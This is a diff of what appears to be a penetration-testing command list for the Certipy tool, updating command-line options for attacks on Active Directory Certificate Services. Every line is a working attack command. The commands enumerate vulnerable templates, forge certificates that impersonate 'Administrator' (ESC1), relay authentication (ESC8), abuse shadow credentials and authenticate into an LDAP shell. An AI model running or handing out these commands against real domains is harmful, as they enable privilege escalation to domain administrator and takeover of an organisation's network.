@@ -1,16 +1,18 @@
 certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD"
-certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP"
-certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
-certipy req -u "$USER@$DOMAIN" -hashes "$NT_HASH" -ca "$CA_NAME" -target "$CA_FQDN" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
-certipy relay -ca "$CA_FQDN" -template "$ESC8_TEMPLATE_NAME"
+certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -dc-host "${DC_HOST:-$TARGET}"
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -ca "$CA_NAME" -target "${ADCS_HOST:-$CA_FQDN}" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
+certipy req -k -no-pass -dc-ip "${DC_IP:-$IP}" -dc-host "${DC_HOST:-$TARGET}" -target "${ADCS_HOST:-$TARGET}" -ca "$CA_NAME" -template "$TEMPLATE" -key-size 4096 -out "$USER".pfx
+certipy req -u "$USER@$DOMAIN" -hashes "$NT_HASH" -ca "${ADCS_HOST:-$CA_FQDN}" -template "$ESC1_TEMPLATE_NAME" -upn "Administrator@$DOMAIN"
+certipy relay -ca "${ADCS_HOST:-$CA_FQDN}" -template "$ESC8_TEMPLATE_NAME"
 certipy shadow auto -u "$USER@$DOMAIN" -p "$PASSWORD" -account "Administrator"
 certipy auth -pfx "$USER".pfx -dc-ip "$IP" -domain "$DOMAIN" -debug
+certipy auth -pfx "$USER".pfx -dc-ip "$DC_IP" -username "$USER" -domain "$DOMAIN" -no-hash
 certipy-ad shadow auto -username "$USER@$DOMAIN" -password "$PASSWORD" -account "$TARGET_USER"
-certipy-ad find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -vulnerable
-certipy-ad find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -vulnerable -enabled -stdout
-certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$TARGET" -ca "$CA_NAME" -template "$TEMPLATE"
-certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$TARGET" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_USER" -out result.pfx
-certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -target "$TARGET" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$TARGET"
+certipy-ad find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -dc-host "${DC_HOST:-$TARGET}" -vulnerable
+certipy-ad find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$IP" -dc-host "${DC_HOST:-$TARGET}" -vulnerable -enabled -stdout
+certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "${DC_IP:-$IP}" -dc-host "${DC_HOST:-$TARGET}" -target "${ADCS_HOST:-$TARGET}" -ca "$CA_NAME" -template "$TEMPLATE"
+certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "${DC_IP:-$IP}" -dc-host "${DC_HOST:-$TARGET}" -target "${ADCS_HOST:-$TARGET}" -ca "$CA_NAME" -template "$TEMPLATE" -upn "$TARGET_USER" -out result.pfx
+certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "${DC_IP:-$IP}" -dc-host "${DC_HOST:-$TARGET}" -target "${ADCS_HOST:-$TARGET}" -ca "$CA_NAME" -template "$TEMPLATE" -dns "$TARGET"
 certipy-ad auth -pfx result.pfx -dc-ip "$IP"
 certipy-ad auth -pfx result.pfx -dc-ip "$IP" -ldap-shell
-certipy-ad relay -ca "$TARGET" -template "$TEMPLATE"
+certipy-ad relay -ca "${ADCS_HOST:-$TARGET}" -template "$TEMPLATE"
